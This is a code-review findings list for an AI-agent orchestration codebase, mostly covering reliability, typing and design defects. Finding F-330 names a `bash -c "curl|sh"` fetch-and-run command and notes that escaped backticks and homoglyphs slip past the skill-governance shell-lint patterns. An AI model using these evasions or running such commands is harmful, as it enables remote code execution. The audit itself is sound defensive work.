- **Where:** `apps/api/src/heartbeats/event-bridge.ts:32`.
- **Observation:** connect to OpenCode SSE has no `AbortController`. A hung server stalls the bridge indefinitely.
- **Proposed fix:** see `fix.md` F-292 — `AbortSignal.timeout(5000)`; bundled with F-066.

#### F-293 🟠 [reliability] · `reader.read()` has no cancel path
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:43`.
- **Observation:** infinite while-loop on a streaming reader. No shutdown hook — a graceful server stop cannot terminate the bridge.
- **Proposed fix:** see `fix.md` F-293 — pass an `AbortSignal` to `fetch`, await it inside the loop.

#### F-294 🟠 [reliability] · Policy load is synchronous per-event
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:163-191`.
- **Observation:** for every `tool-invocation` event, we fetch trust score + evaluate policy + potentially write violation + trust update. High-volume streams serialize on DB round-trips.
- **Proposed fix:** see `fix.md` F-294 — cache trust score per (agentId, beatId); batch violations; bundled with F-118.

#### F-295 🟠 [reliability] · `session.error` triggers inline `recordMeeting` side effect
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:294-316`.
- **Observation:** a single developer error spawns an escalation meeting inline in the event handler. Crashes or repeated session errors in a loop can flood the meetings table.
- **Proposed fix:** see `fix.md` F-295 — debounce + deduplicate escalations; queue via outbox.

#### F-296 🟡 [type] · `event.properties` typed `Record<string, any>` (F-031 family)
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:82`.
- **Observation:** the entire SSE payload is `any`, propagating through every field access.
- **Proposed fix:** see `fix.md` F-296 — Zod `OpencodeEventSchema`; validate on parse; bundled with F-031.

#### F-297 🟡 [code] · Three-fallback sessionID resolution
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:86`.
- **Observation:** `props.info?.sessionID ?? props.part?.sessionID ?? props.sessionID`. Indicates schema-drift compensation across OpenCode versions. Use one canonical shape.
- **Proposed fix:** see `fix.md` F-297 — normalizer in parse; bundled with F-296.

#### F-298 🟡 [code] · Hardcoded tool-name list for edit detection
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:201`.
- **Observation:** `toolName === "edit" || "write" || "patch" || "apply_patch"`. Adding a new OpenCode edit tool silently misses file-edit telemetry.
- **Proposed fix:** see `fix.md` F-298 — tool classifier table keyed by capability.

#### F-299 🟡 [code][perf] · `new TextDecoder()` per chunk
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:46`.
- **Observation:** decoder instantiated inside the loop. Minor perf — should be hoisted.
- **Proposed fix:** see `fix.md` F-299 — hoist to module scope.

#### F-300 🟡 [obs] · JSON parse errors silently dropped
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:63-65`.
- **Observation:** `catch {}` on `JSON.parse` with no counter. A malformed event stream disappears without trace.
- **Proposed fix:** see `fix.md` F-300 — counter + periodic warn; bundled with F-068.

#### F-301 🟡 [obs][code] · `emitEmployeeActivity("system", ...)` uses string role
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:35, 69`.
- **Observation:** `"system"` is not in `AgentIdentity["role"]` enum — stringly-typed. F-098 family.
- **Proposed fix:** see `fix.md` F-301 — `SystemRole | AgentRole`; bundled with F-098.

#### F-302 🟡 [code] · `setTimeout(... 3000)` magic reconnect delay
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:73`.
- **Observation:** fixed 3s delay; no backoff or jitter. Reconnect storms on persistent OpenCode downtime.
- **Proposed fix:** see `fix.md` F-302 — exponential backoff (250ms → 16s) + jitter; bundled with F-070.

#### F-303 🟢 [code] · `bash` cmd truncated at 180 chars (F-094)
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:216`.
- **Observation:** `args.command.slice(0, 180)`. Same truncation family as F-094/F-268.
- **Proposed fix:** see `fix.md` F-303 — `truncateTelemetry`; bundled with F-094.

#### F-304 🟢 [arch] · `setExecutionStatus("error")` cross-module side effect
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:291`.
- **Observation:** event handler directly flips a global execution-status flag. Should be via an explicit execution-state machine.
- **Proposed fix:** see `fix.md` F-304 — bundled with F-043 state refactor.

---

### apps/api/src/orchestration/{bootstrap,execution-cycle,reactive}.ts

#### F-305 🔴 [reliability] · `setActiveExecution(null)` races with in-flight async work
- **Where:** `apps/api/src/orchestration/execution-cycle.ts:77, 198, 260`.
- **Observation:** execution context cleared before `checkSprintCompletion()`, `recordMeeting()`, etc. complete. A heartbeat firing mid-cleanup finds null activeExecution but still-running work — orphaned tasks.
- **Proposed fix:** serialize cleanup via promise chain; swap state only after all awaits resolve.

#### F-306 🔴 [reliability] · Stale snapshot drift in `completeExecutionCycle`
- **Where:** `apps/api/src/orchestration/execution-cycle.ts:26 → 79 → 113`.
- **Observation:** `getSnapshot()` captured once at entry; multiple async mutations between reads. Downstream branches filter a snapshot that no longer reflects DB state.
- **Proposed fix:** re-snapshot at each async boundary or promote the cycle to a single transactional unit.

#### F-307 🟠 [reliability] · No AbortSignal on long-running async chain
- **Where:** `apps/api/src/orchestration/execution-cycle.ts:25-80, 111-139`.
- **Observation:** `runAutonomousReadyTasks`, `checkSprintCompletion` awaited without cancellation. Board-stop request at `:141` cannot interrupt in-flight work. Bundled with F-066/F-262.

#### F-308 🟠 [reliability] · No transactional guard on `setTaskStatus` + `recordMeeting`
- **Where:** `apps/api/src/orchestration/execution-cycle.ts:42-51, 54-75, 156-157`.
- **Observation:** impactedTaskIds computed from stale snapshot, then mutated without re-validation; meeting recorded after task updated with no atomicity. Bundled with F-086.

#### F-309 🟡 [code] · Hardcoded `boardOwner: "Board"` and `budgetCents: 999_999_999`
- **Where:** `apps/api/src/orchestration/bootstrap.ts:23`.
- **Observation:** magic sentinels for bootstrap; no docs on why these values.

#### F-310 🟡 [code] · Inconsistent boardDecision default strings
- **Where:** `apps/api/src/orchestration/execution-cycle.ts:128, 134`.
- **Observation:** `"No blocking items"` vs `"Board review required."` — different defaults for the same missing-reason condition.

#### F-311 🟡 [code] · `reactive.ts` silently no-ops on missing emitter/scheduler
- **Where:** `apps/api/src/orchestration/reactive.ts:8-9, 19, 31-32, 35, 38`.
- **Observation:** reactive events dropped with no log when dependency is null; callers cannot tell event was swallowed.

#### F-312 🟡 [code] · Hardcoded leadership roles in meeting templates
- **Where:** `apps/api/src/orchestration/execution-cycle.ts:110-111, 172-173, 184, 189, 237-238, 251`.
- **Observation:** `"ceo"`, `"cto"` as string literals; F-098 family — bundled with F-098/F-223/F-264.

#### F-313 🟡 [code] · Repeated pluralization ternary `task${n === 1 ? "" : "s"}`
- **Where:** `apps/api/src/orchestration/execution-cycle.ts:34, 48, 70, 115, 219, 230`.
- **Observation:** 6 duplicates; should be `pluralize("task", n)` helper.

#### F-314 🟢 [code] · `executionStatus` check misses "running" state
- **Where:** `apps/api/src/orchestration/execution-cycle.ts:142`.
- **Observation:** `["idle", "done", "error", "paused"].includes(executionStatus)` — unclear behavior if status is `"running"`.

---

### apps/api/src/agents/{ceo,chat,sessions}.ts

#### F-315 🔴 [reliability] · TOCTOU on `snapshot` across async `bootstrapIdeaWithWorkspace`
- **Where:** `apps/api/src/agents/chat.ts:115-122, 136, 181, 212`.
- **Observation:** `getSnapshot()` read at :115, async mutation at :118, stale snapshot passed to `startCeoPromptAsync(msg, snapshot)` at :136. Classification + retry at :181-212 all run on a snapshot that no longer matches the store.
- **Proposed fix:** re-snapshot after every `await` boundary; bundled with F-306.

#### F-316 🔴 [reliability] · Unhandled rejection on `emitBeatEvent` in stream finalizer
- **Where:** `apps/api/src/agents/chat.ts:225-231`.
- **Observation:** `emitBeatEvent(...)` awaited inside `finally` but wrapped in empty catch — board_message event dropped if emit fails; heartbeat chain broken silently.

#### F-317 🟠 [reliability] · `readSseEvent` buffer accumulates unbounded
- **Where:** `apps/api/src/agents/chat.ts:47-77`.
- **Observation:** while-loop accumulates `nextBuffer` with no size cap; a broken upstream streaming unlimited data causes OOM.

#### F-318 🟠 [type][reliability] · `enforceMandatoryRoles` bypasses `validateStrategyRoles`
- **Where:** `apps/api/src/agents/ceo.ts:85-86, 142-151`.
- **Observation:** server-side role injection skips the Zod superRefine — injected entries slip past parent_role hierarchy checks. `getRoleSoul(entry.parent_role as any)` and `includes(entry.role as any)` strip types.

#### F-319 🟠 [reliability] · `recordCeoCardMeeting` call not awaited
- **Where:** `apps/api/src/agents/chat.ts:188`.
- **Observation:** `recordCeoCardMeeting(card, trimmedMessage, fullText)` — side effects may not settle before `getSnapshot()` at :199 observes the store.

#### F-320 🟠 [reliability] · Fallback card hardcodes `meeting.create = false`
- **Where:** `apps/api/src/agents/ceo.ts:542`.
- **Observation:** retry-fallback card forever suppresses meeting creation; no reconciliation path even if board later requests one.

#### F-321 🟠 [reliability] · Second `structuredCompletion` throws uncaught on retry
- **Where:** `apps/api/src/agents/ceo.ts:606-611`.
- **Observation:** retry path invokes `structuredCompletion` again without try/catch; rejection propagates to caller with no rollback of the first attempt's telemetry.

#### F-322 🟠 [arch] · `ceo.ts` is a 626-line god file
- **Where:** `apps/api/src/agents/ceo.ts:1-627`.
- **Observation:** schema definitions + summarization + stage inference + prompt builders + classifier + strategy generator + fallback construction in one module. Split by concern (`ceo-schema.ts`, `ceo-summarize.ts`, `ceo-classify.ts`, `ceo-strategy.ts`).

#### F-323 🟡 [obs] · `console.warn/error` in CEO retry/truncation path
- **Where:** `apps/api/src/agents/ceo.ts:502, 521`.
- **Observation:** direct console — F-037 family.

#### F-324 🟡 [code] · Magic summarization slice limits (`8, 4, 5, 280, 150, 400`)
- **Where:** `apps/api/src/agents/ceo.ts:236, 270, 287, 307, 361, 365, 529`.
- **Observation:** six different magic numbers; no named constants.

#### F-325 🟡 [code] · Silent 150-char truncation with no ellipsis
- **Where:** `apps/api/src/agents/ceo.ts:365`.
- **Observation:** `m.content.slice(0, 150)` — reader cannot tell content was cut. F-094 family.

#### F-326 🟡 [code] · Repeated linear filters on `snapshot.tasks`
- **Where:** `apps/api/src/agents/ceo.ts:305-310, 314-315, 318-319, 329-332`.
- **Observation:** 3-4 independent `.filter()` passes over the same array; fold into a single reducer.

#### F-327 🟡 [code] · `sessions.ts:resolveRoleBySessionId` linear scan
- **Where:** `apps/api/src/agents/sessions.ts:30-35`.
- **Observation:** O(n) scan on every event; maintain a reverse `sessionId → role` index on mutation.

#### F-328 🟡 [code] · `Object.assign(session, patch)` mutates in-place
- **Where:** `apps/api/src/agents/sessions.ts:7`.
- **Observation:** mutation of a Map value may not trigger reactivity; use spread + `set`. F-143/F-235 family.

#### F-329 🟢 [code] · `queuedFollowUpCount` computed only to be embedded in a template
- **Where:** `apps/api/src/orchestration/execution-cycle.ts:209-211`.
- **Observation:** dead intermediate — derive inline.

---

### apps/api/src/skills/* + packages/company-runtime/src/skill-*.ts

#### F-330 🔴 [sec] · Shell-lint patterns in governance are incomplete (RCE-adjacent)
- **Where:** `apps/api/src/skills/governance.ts:44-54`.
- **Observation:** conservative `/\$\(\s*[\w./-]/` and similar patterns fail to catch double-escaped backticks, `bash -c "curl|sh"` embedded in prose, or Unicode-homoglyph tricks. A skill mutation approved by governance then executed via OpenCode bash is the RCE path. Bundled with F-087.

#### F-331 🔴 [reliability] · Unhandled fire-and-forget `runATAPipeline(...)`
- **Where:** `apps/api/src/skills/cross-sprint.ts:59-63, 86-87`; `apps/api/src/heartbeats/checklist-executor.ts:304, 351` (already F-279).
- **Observation:** cross-sprint mutation dispatch uses `.then(...).catch(console.warn)` — skill proposal failure leaves the mutation in `proposed` state with no retry or dead-letter queue. F-279 family.

#### F-332 🔴 [reliability] · CAS gap on `updateMutationStatus`
- **Where:** `apps/api/src/skills/governance.ts:386-414` vs callers in `cross-sprint.ts:59`.
- **Observation:** governance gate flips mutation status to `"rejected"` asynchronously *after* some callers have already dispatched the ATA pipeline. No CAS — two governance passes can race.

#### F-333 🟠 [reliability] · `skill-mutator.ts` throws on null `getSkillById`
- **Where:** `packages/company-runtime/src/skill-mutator.ts:150-156, 158, 206`.
- **Observation:** `deps!` and lookups that can return null throw generic errors instead of returning a typed noop. Brittle in the beat pipeline.

#### F-334 🟠 [reliability] · Classifier failure logged, never retried
- **Where:** `apps/api/src/skills/classifier.ts:82-86`.
- **Observation:** cold tasks may never get skill matches after the first beat. Also: bundled with F-015/F-259 — classifier is slated for deletion.

#### F-335 🟠 [reliability] · `updateMutationStatus` storm in skill-tester revision loop
- **Where:** `packages/company-runtime/src/skill-tester.ts:99-161`.
- **Observation:** multiple status writes during iteration without transaction; connection drop leaves mutation half-tested.

#### F-336 🟠 [perf] · `getAllSkills` full-scans per health check
- **Where:** `packages/company-runtime/src/skill-registry.ts:87-92`.
- **Observation:** no index on `companyId`; every governance/health query pays O(n) over the whole registry.

#### F-337 🟠 [perf] · O(n²) rebuild of `activeSkillIndex` on every register
- **Where:** `packages/company-runtime/src/skill-registry.ts:45-48`.
- **Observation:** insert triggers full index rebuild. At 100 skills the loop is 10 k ops per insert.

#### F-338 🟡 [code] · Advisory-only cost enforcement on mutations
- **Where:** `apps/api/src/skills/governance.ts:323-357`.
- **Observation:** `estimatedCostCents` logged but no hard budget check — actual LLM costs can exceed estimate silently.

#### F-339 🟡 [code] · Hardcoded `staleDays * 24 * 60 * 60 * 1000` date math
- **Where:** `packages/company-runtime/src/skill-registry.ts:222, 228`.
- **Observation:** day-math repeated; extract `daysToMs(n)` helper.

#### F-340 🟡 [code] · Hardcoded skills caps (`3`, `240`) in classifier/catalog
- **Where:** `apps/api/src/skills/catalog.ts:50`, `apps/api/src/skills/classifier.ts:14, 18`.
- **Observation:** magic limits in three places; no named constants. Slated for obsolescence by F-015/F-259 anyway.

#### F-341 🟡 [code] · Deprecated exports still present
- **Where:** `apps/api/src/skills/catalog.ts:79-93` (`buildSkillMenu`, `getSkillBody`), `apps/api/src/skills/cross-sprint.ts:73-94` (`runPatternPromotionSweep`).
- **Observation:** marked `@deprecated` but still exported + referenced. Safe to remove.

#### F-342 🟡 [code] · `evolution.ts` is 544 LOC
- **Where:** `apps/api/src/skills/evolution.ts:1-544`.
- **Observation:** proposal + synthesis + testing orchestration in one module; split by pipeline phase.

#### F-343 🟡 [obs] · 30+ `console.log/warn` call sites in skills
- **Where:** `apps/api/src/skills/*` and `packages/company-runtime/src/skill-*`.
- **Observation:** F-037 family. Move to structured logger.

#### F-344 🟢 [code] · `"approve" | "reject"` verdict cast without validation
- **Where:** `packages/company-runtime/src/skill-tester.ts:196`.
- **Observation:** last-result verdict coerced by cast; a malformed LLM output slips through.

---

### apps/api/src/sprints/*

#### F-345 🔴 [reliability] · Lost write on `reviewState.phase` early-return
- **Where:** `apps/api/src/sprints/review.ts:166`.
- **Observation:** `!previewProbe.reachable` exits before persisting phase transition. A flaky preview leaves `reviewState` stuck. Bundled with F-086/F-277.

#### F-346 🔴 [reliability] · Double `updateSprint` writes racing
- **Where:** `apps/api/src/sprints/review.ts:317-320, 467-470`.
- **Observation:** two concurrent review-state updates with no CAS — later write clobbers earlier. F-086 family.

#### F-347 🔴 [reliability] · `workspaceManager.tagSprint` failure swallowed in lifecycle
- **Where:** `apps/api/src/sprints/lifecycle.ts:199-202`.
- **Observation:** caught + logged only. Sprint marked complete while artifact tag missing — incomplete bundle on next rollback attempt.

#### F-348 🟠 [reliability] · No AbortSignal on verification LLM call
- **Where:** `apps/api/src/sprints/review.ts:264, 286`; `apps/api/src/sprints/proposals.ts:102-110`.
- **Observation:** `runPromptText` + `structuredCompletion` without timeout/abort — stuck beat hangs indefinitely. Bundled with F-262.

#### F-349 🟠 [reliability] · Empty catch on QA-report extraction
- **Where:** `apps/api/src/sprints/review.ts:300-302`.
- **Observation:** parse failure → `qaReport = null` → treated as a *tool* failure rather than an actual QA failure. Misclassifies real defects.

#### F-350 🟠 [reliability] · No transaction on sprint task creation
- **Where:** `apps/api/src/sprints/proposals.ts:199-348`.
- **Observation:** tasks created in a loop — mid-loop error leaves a partial sprint with dangling dependencies. Bundled with F-086.

#### F-351 🟠 [reliability] · CEO proposal cooldown guard prone to stale card reuse
- **Where:** `apps/api/src/sprints/proposals.ts:73-75, 79-82, 146-161`.
- **Observation:** duplicate-guard returns early without distinguishing "same card as before" from "different but still cooling down."

#### F-352 🟠 [arch] · `executeSprintReviewVerification` is a 424-line god function
- **Where:** `apps/api/src/sprints/review.ts:131-554`.
- **Observation:** probe health + entry check + prompt build + LLM + QA parse + bug routing + graph emit + state update in one function. Extract phases.

#### F-353 🟠 [arch] · `approveSprintProposal` is a 215-line god function
- **Where:** `apps/api/src/sprints/proposals.ts:168-383`.
- **Observation:** create sprint + tasks + deps + integration + CTO review + persist + graph emit, all inline.

#### F-354 🟡 [code] · Stringly-typed phase names (`tester_verification`, `final_gate`, `rework`, `escalated`)
- **Where:** `apps/api/src/sprints/review.ts:319, 511, 761, 776, 785`; `apps/api/src/sprints/lifecycle.ts:187-196`.
- **Observation:** F-099/F-239 family — add `SprintReviewPhase` enum.

#### F-355 🟡 [code] · `stderr.slice(0, 1500)` in bug task description
- **Where:** `apps/api/src/sprints/review-helpers.ts:238`.
- **Observation:** mid-message cut without `…` marker; F-094 family.

#### F-356 🟡 [code] · Repeated `reviewState as Record<string, unknown[]>` casts
- **Where:** `apps/api/src/sprints/lifecycle.ts:151, 170, 187-196, 203`.
- **Observation:** re-casts per site; define `ReviewState` interface. Bundled with F-239.

#### F-357 🟡 [code] · Hardcoded `max review cycles = 3`, `slice(0, 200)` in error
- **Where:** `apps/api/src/sprints/lifecycle.ts:151, 167`; `apps/api/src/sprints/verification-gate.ts:45-46 (slice 4096)`.
- **Observation:** magic caps; F-265 family.

#### F-358 🟢 [code] · Dead `if/else` branch in verification gate
- **Where:** `apps/api/src/sprints/verification-gate.ts:89-90`.
- **Observation:** `if (config.autoSkipOnNoPackageJson) return result; // else fall through` — else path never executes; clarify or remove.

---

### apps/api/src/meetings/* + packages/company-runtime/src/meeting-*.ts

#### F-359 🔴 [reliability] · `updateMeeting` overwrites entire object (lost-write)
- **Where:** `packages/company-runtime/src/meeting-pipeline.ts:140-158`.
- **Observation:** spreads entire meeting object including nested resolutions. Two concurrent status transitions — second clobbers the first's decisions. F-086/F-277 family.

#### F-360 🔴 [reliability] · Fire-and-forget `deps.runPipeline()` in scheduler tick
- **Where:** `packages/company-runtime/src/meeting-scheduler.ts:162-165, 339-341, 399-401`.
- **Observation:** pipeline failure only logs; no retry, no deadline. Concurrent ticks can enqueue overlapping pipelines.

#### F-361 🔴 [reliability] · Non-atomic `upsertMeeting` + `updateMeetingSchedule`
- **Where:** `packages/company-runtime/src/meeting-scheduler.ts:147-148`.
- **Observation:** two writes with no transaction. Crash between them creates a meeting with no schedule bookkeeping (or vice versa); F-086 family.

#### F-362 🟠 [reliability] · `skipCount`/`totalRuns` increments without CAS
- **Where:** `packages/company-runtime/src/meeting-scheduler.ts:136-142, 151-158`.
- **Observation:** read-modify-write; concurrent ticks lose increments. Bundled with F-086.

#### F-363 🟠 [reliability] · Meeting synthesis/resolve LLM calls lack try/catch
- **Where:** `apps/api/src/meetings/synthesis.ts:73-83, 144-154`; `apps/api/src/meetings/resolution.ts:95-104, 278-288`.
- **Observation:** LLM network failures propagate; caller's `try` not present at all call sites.

#### F-364 🟠 [reliability] · `ensureDailySyncExists` idempotence race
- **Where:** `packages/company-runtime/src/meeting-scheduler.ts:218-254`.
- **Observation:** read `hasDailySync` then create — two ticks can both pass the check and create duplicates.

#### F-365 🟠 [type] · Multiple `as Task["status"]/priority/assignedRole` casts in resolution
- **Where:** `apps/api/src/meetings/resolution.ts:154-155, 157, 188-190`.
- **Observation:** LLM output coerced into typed enums with no Zod validation; malformed output silently mistyped.

#### F-366 🟠 [reliability] · `executeMeetingDecisions` not awaited in pipeline
- **Where:** `packages/company-runtime/src/meeting-pipeline.ts:214-225`.
- **Observation:** decision execution fire-and-forget while state transitions to next phase — F-290 family.

#### F-367 🟠 [reliability] · `applyMeetingEffects` result ignored
- **Where:** `apps/api/src/meetings/recording.ts:93`.
- **Observation:** async effects not awaited; `recordMeeting` may return before task modifications settle.

#### F-368 🟡 [code] · Meeting type strings (`"escalation"`, `"eval_triggered"`, `"daily_sync"`) hardcoded across modules
- **Where:** `apps/api/src/meetings/recording.ts:96-102, 229-230`; `apps/api/src/tasks/specialist-executor.ts:92-116, 172-203`.
- **Observation:** no enum — typos silently create new meeting types.

#### F-369 🟡 [code] · `MANAGER_ROLE_MAP` is static
- **Where:** `packages/company-runtime/src/meeting-scheduler.ts:425-437`.
- **Observation:** hardcoded manager chain; new roles become stale silently.

#### F-370 🟡 [arch] · `meeting-scheduler.ts` is 438 LOC
- **Where:** `packages/company-runtime/src/meeting-scheduler.ts:1-438`.
- **Observation:** tick loop + assessment + escalation + daily-sync + manager lookup. Split by concern.

#### F-371 🟡 [code] · Counter-intuitive `conditionalCheckEnabled` logic
- **Where:** `packages/company-runtime/src/meeting-scheduler.ts:187`.
- **Observation:** `if (!schedule.conditionalCheckEnabled) return true` means "if checking disabled, always meet" — easy to misread.

#### F-372 🟡 [code] · Magic 80-char / 100-char / 0.8 confidence / 30-day constants
- **Where:** `packages/company-runtime/src/meeting-memory.ts:131, 157, 172`; `apps/api/src/meetings/recording.ts:116`.
- **Observation:** extract into named constants.

#### F-373 🟢 [code] · `participantAgentIds` copied without existence check
- **Where:** `packages/company-runtime/src/meeting-scheduler.ts:267`.
- **Observation:** stale IDs from a previous schedule can land on a new meeting.

---

### apps/api/src/tasks/* + packages/task-engine/*

#### F-374 🔴 [reliability] · Concurrent `setTaskStatus` duplicates `incomingArtifactIds`
- **Where:** `apps/api/src/tasks/mutations.ts:269-300`.
- **Observation:** dependency-promotion loop with no CAS; if a task completes twice (idempotency bug elsewhere), children accumulate duplicate artifact refs. Bundled with F-086.

#### F-375 🔴 [reliability] · Hippocampus + pattern-learner writes silently lost on failure
- **Where:** `apps/api/src/tasks/mutations.ts:304-413, 377-379, 408-410`.
- **Observation:** `hippocampus.processTaskCompletion()` + `processTaskOutcome()` fire-and-forget with `.catch(logger.warn)`. No outbox; memory insert failures vanish.

#### F-376 🟠 [arch] · `setTaskStatus` is a 415-line side-effect god function
- **Where:** `apps/api/src/tasks/mutations.ts:215-414`.
- **Observation:** graph emission + audit + escalation + downstream promotion + hippocampus hook + skill learning + pattern extraction — all coupled to a single status transition. Split via event bus.

#### F-377 🟠 [reliability] · No AbortSignal on cross-sprint transfer
- **Where:** `packages/task-engine/src/sprint-lifecycle.ts:248-255`.
- **Observation:** `cb.runCrossSprintTransfer()` fire-and-forget with no deadline. Hanging transfer accumulates beats.

#### F-378 🟠 [reliability] · Dependency promotion skips null checks
- **Where:** `apps/api/src/tasks/mutations.ts:279-300`.
- **Observation:** `snapshot.tasks.find(...)` then `updateTask(...)` without null guard. F-041 family.

#### F-379 🟠 [type] · `activeAgents[0]!.id` non-null assertion
- **Where:** `apps/api/src/tasks/specialist-executor.ts:227`.
- **Observation:** array access with `!`; refactor to runtime guard. F-278 family.

#### F-380 🟠 [reliability] · Meeting synthesis null-safety gaps in specialist executor
- **Where:** `apps/api/src/tasks/specialist-executor.ts:39, 90, 152, 245`.
- **Observation:** `meeting.resolutions?.decisions` cast to const without validation; `getPreviewEvidenceUrl()` result used without null check; task `find()` unchecked.

#### F-381 🟡 [code] · Magic `20` artifact cap repeated inconsistently
- **Where:** `apps/api/src/tasks/mutations.ts:260-261, 294-295`; `packages/task-engine/src/task-state-machine.ts:138-140, 179-180`.
- **Observation:** same limit in 4 sites; extract.

#### F-382 🟡 [code] · Magic `-50` results/commands slice repeated
- **Where:** `apps/api/src/meetings/effects.ts:39`; `apps/api/src/tasks/mutations.ts:140`; `apps/api/src/tasks/specialist-executor.ts:205`.
- **Observation:** three duplicates of the same tail-slice window.

#### F-383 🟡 [code] · Artifact content truncated to `artifactBudget` without marker
- **Where:** `apps/api/src/tasks/mutations.ts:122-130`.
- **Observation:** F-094 family.

#### F-384 🟡 [code] · Format-string coupling (`"edited:"`, `"preview:"`, `"meeting:"` prefixes)
- **Where:** `apps/api/src/tasks/helpers.ts:38-40`; `apps/api/src/tasks/mutations.ts:108-120`; `apps/api/src/meetings/effects.ts:39`.
- **Observation:** decorated strings parsed downstream — stringly-typed protocol; F-249 family.

#### F-385 🟡 [perf] · Repeated `getSnapshot()` in `setTaskStatus` path
- **Where:** `apps/api/src/tasks/mutations.ts:216, 252-253, 305-306`; `packages/task-engine/src/task-state-machine.ts:82, 99, 110, 130, 194`.
- **Observation:** 3-5 snapshot reads per function; coalesce.

#### F-386 🟡 [type] · `as Task["status"]` casts across state machine
- **Where:** `packages/task-engine/src/task-state-machine.ts:129, 158, 193`.
- **Observation:** F-155 family — validate via enum.

#### F-387 🟡 [arch] · `packages/task-engine/execution-cycle.ts` duplicates orchestrator logic
- **Where:** `packages/task-engine/src/execution-cycle.ts:1-137` vs `apps/api/src/orchestration/execution-cycle.ts`.
- **Observation:** two execution-cycle modules with overlapping names and roles. Unify or rename.

#### F-388 🟡 [code] · `task-state-machine` has no explicit transition guard matrix
- **Where:** `packages/task-engine/src/task-state-machine.ts:1-201`.
- **Observation:** status flips via `updateTask(...)` with no check that `prev → next` is legal. Any-to-any transitions possible.

#### F-389 🟢 [code] · `mapTaskPriority` is an identity function
- **Where:** `apps/api/src/tasks/planner.ts:124-126`.
- **Observation:** only returns input — dead indirection.

#### F-390 🟢 [code] · `follow_up`/`bug_fix` filters scattered with no shared predicate
- **Where:** `packages/task-engine/src/sprint-lifecycle.ts:93, 225`; `apps/api/src/tasks/specialist-executor.ts:280-281`.
- **Observation:** `kind === "follow_up"` checks in 3+ places.

---

### apps/api/src/prompts/* + apps/api/src/observability/*

#### F-391 🔴 [reliability] · Event loss on audit flush after DB failure threshold
- **Where:** `apps/api/src/observability/audit-ledger.ts:94-106`.
- **Observation:** after `MAX_DB_FAILURES`, `pendingFlush` is cleared — audit events silently lost even if DB later recovers.

#### F-392 🔴 [reliability] · `pendingFlush` mutated concurrently with timer
- **Where:** `apps/api/src/observability/audit-ledger.ts:53-104`.
- **Observation:** `flushToDb()` splices while the interval may re-enter; no lock — events can be double-flushed or dropped.

#### F-393 🔴 [sec] · Unbounded graph node/edge growth
- **Where:** `apps/api/src/observability/graph-store.ts:227-228`.
- **Observation:** append-only with no capacity bound. Long-lived processes OOM on sustained sprint execution.

#### F-394 🟠 [perf] · SSE `Subscribers` Set not cleaned on broken connections
- **Where:** `apps/api/src/observability/activity.ts:19-52, 72-75`.
- **Observation:** empty catch on write drops interval but not the subscriber; leak accumulates over session life.

#### F-395 🟠 [reliability] · No AbortSignal threaded into `runPromptText`
- **Where:** `apps/api/src/prompts/llm.ts:79-93, 140-152, 226`.
- **Observation:** 5-minute timer registered but `opencode.client.session.prompt()` gets no AbortSignal — hung request leaks the connection.

#### F-396 🟠 [type] · `(tools as any)[k]` and `statusResult.data as Record<...>` casts
- **Where:** `apps/api/src/prompts/llm.ts:134, 145, 209, 225, 245-246`.
- **Observation:** multiple `as any` / loose casts across the LLM call path; F-031 family.

#### F-397 🟠 [type] · `null as unknown as GraphNode` bypass in emitter
- **Where:** `apps/api/src/observability/graph-emitter.ts:348`.
- **Observation:** disguises an invariant violation rather than fixing it. A consumer expecting a node receives null at runtime.

#### F-398 🟡 [code] · Hardcoded 2000-item activity ring buffer
- **Where:** `apps/api/src/observability/activity.ts:43`.
- **Observation:** inconsistent with audit ledger's config pattern.

#### F-399 🟡 [code] · 10_000 ms SSE heartbeat interval magic
- **Where:** `apps/api/src/observability/activity.ts:77`.
- **Observation:** promote to `CONFIG.SSE_HEARTBEAT_MS`.

#### F-400 🟡 [code] · Artifact budget `6000` chars magic
- **Where:** `apps/api/src/prompts/artifacts.ts:13`.
- **Observation:** no correlation to LLM token budget; name + justify.

#### F-401 🟡 [code] · 100-file listing cap in developer prompt
- **Where:** `apps/api/src/prompts/developer.ts:29-34`.
- **Observation:** `slice(0, 100)` — F-094 family.

#### F-402 🟡 [code] · Audit ledger itself uses `console.log`
- **Where:** `apps/api/src/observability/audit-ledger.ts:91, 100, 103`.
- **Observation:** observability dogfood violation; emit audit events instead.

#### F-403 🟡 [code] · `DecisionEntry["type"]` union unvalidated
- **Where:** `apps/api/src/observability/graph-store.ts:48-59`.
- **Observation:** TypeScript union accepts anything assignable; no runtime Zod check.

#### F-404 🟢 [code] · Unused `alternatives: string[]` field on `DecisionEntry`
- **Where:** `apps/api/src/observability/graph-store.ts:63`.
- **Observation:** never populated; dead field.

#### F-405 🟢 [code] · `beatNode.toolCalls` array never populated
- **Where:** `apps/api/src/observability/graph-store.ts:84`.
- **Observation:** declared, unused.

---

### packages/hippocampus/*

#### F-406 🔴 [sec] · Potential SQL injection in habit ID array construction
- **Where:** `packages/hippocampus/src/backends/pgvector.ts:389-401`.
- **Observation:** `sql.join()` + template string composition for habit IDs — if raw user IDs reach this path without validation, injection vector exists. Validate empty + format.

#### F-407 🟠 [reliability] · No timeout on embedding pipeline init
- **Where:** `packages/hippocampus/src/backends/embedding.ts:12-22`.
- **Observation:** `loadingPromise` can hang forever on HuggingFace download; no `AbortController`.

#### F-408 🟠 [reliability] · Concurrent `embed()` triggers parallel downloads
- **Where:** `packages/hippocampus/src/backends/embedding.ts:9-23`.
- **Observation:** multiple callers race to load pipeline; cache only populated after first success — others wait on their own download.

#### F-409 🟠 [reliability] · Fire-and-forget insert with embedding fallback
- **Where:** `packages/hippocampus/src/backends/pgvector.ts:111-116, 200-205, 212-218, 289`.
- **Observation:** `try { embed(); insert(withVector) } catch { insert(withoutVector) }` pattern in 4 places. Row written without embedding silently — later vector search misses it. No reconciliation.

#### F-410 🟠 [reliability] · Non-transactional multi-step habit/fact routing
- **Where:** `packages/hippocampus/src/service.ts:222-256, 277-350`.
- **Observation:** `list → decide → add/update` in separate queries; concurrent extractions create duplicates.

